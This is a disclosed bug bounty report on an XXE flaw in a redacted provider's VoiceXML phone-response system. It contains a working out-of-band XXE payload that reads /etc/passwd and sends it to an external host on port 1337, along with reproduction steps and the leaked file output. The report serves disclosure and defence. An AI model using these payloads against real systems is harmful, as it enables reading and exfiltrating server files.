---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '395296'
original_report_id: '395296'
title: Phone Call to XXE via Interactive Voice Response
team_handle: redact
created_at: '2017-06-15T00:52:05.000Z'
disclosed_at: '2018-08-15T01:35:10.399Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 171
tags:
- hackerone
---

# Phone Call to XXE via Interactive Voice Response

## Metadata

- HackerOne Report ID: 395296
- Weakness: 
- Program: redact
- Disclosed At: 2018-08-15T01:35:10.399Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

| Summary | 
|--|

> ████ is vulnerable to XXE due to the processing of DTDs

| Description |
|--|
> *"VoiceXML (VXML) is a digital document standard for specifying interactive media and voice dialogs between humans and computers. It is used for developing audio and voice response applications"*

> When a user purchases a phone number through █████,  they are given an option to forward inbound calls to an Interactive Voice Response (IVR) script (containing VoiceXML". 

> An attacker can create a VoiceXML file containing DTD's and the IVR system will process the entities.

| Reproduction Steps |
| -- |

1.) Save the following files to your server in the web root:

- _**payload.vxml**_:

```
<?xml version='1.0' encoding='UTF-8' ?>
<!DOCTYPE foo [
<!ENTITY % b SYSTEM "file:///etc/passwd">
<!ENTITY % asd SYSTEM "http://example.com/lol.xml"> %asd; %rrr;]>
<vxml version="2.1">
<form>
<block>
<prompt>payload executed</prompt>
</block>
</form>
</vxml>
```

- _**lol.xml**_:

```
<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM 'http://example,com:1337/%b;'>">%c;
```

1.) Visit `https://dashboard.█████.com/your-numbers`
2.) Click "Edit" on a phone number.
3.) Go down to Voice and click "Forward to VoiceXML" and set the script URL to your malicious VXML file: (https://example.com/payload.vxml)
4.)  Start a `netcat` listener and call that number:

The IVR system will process the entities and send you the contents of `/etc/passwd` on port 1337:

```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
saslauth:x:499:76:"Saslauthd user":/var/empty/saslauth:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
nslcd:x:65:55:LDAP Client User:/:/sbin/nologin
puppet:x:52:52:Puppet:/var/lib/puppet:/sbin/nologin
logstash:x:498:499:logstash:/opt/logstash:/sbin/nologin
nagios:x:497:498::/var/spool/nagios:/sbin/nologin
nrpe:x:496:497:NRPE user for the NRPE service:/var/run/nrpe:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin
unbound:x:495:496:Unbound DNS resolver:/etc/unbound:/sbin/nologin
consul:x:494:495:Hashicorp consul.io:/opt/consul:/bin/false 
```

| Proof-of-Concept Video: |
|--|
Here is a proof-of-concept of me getting `/etc/issue`:  https://youtu.be/RbIB50R6IQA

| Mitigation: |
|--|
The suggested mitigation was to disable entities or move from Voice XML to JSON for their Text-to-Speech API's.


|Outro:|
|--|
This is probably the most fun bug I've found thus far, I had fun finding it - I hope you had fun reading about it!

Thanks,
Corben Leo

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
